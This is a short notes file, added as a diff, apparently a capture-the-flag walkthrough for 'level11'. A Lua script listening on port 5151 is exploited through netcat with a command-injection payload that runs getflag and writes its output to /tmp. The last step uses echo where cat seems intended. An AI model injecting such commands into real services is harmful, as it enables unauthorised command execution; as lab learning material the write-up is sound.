@@ -1,0 +1,8 @@
+* the script level11.lua is launch by flag11 (ps aux | grep -i lua)
+* we see it can launch commmand
+* we have to use socket to send the command port 5151 (see in level11.lua)
+
+* we print out of getflag command in a file in /tmp directorie
+- nc localhost 5151
+	-> $(getflag) > /tmp/toto ; echo tutu
+- echo /tmp/toto
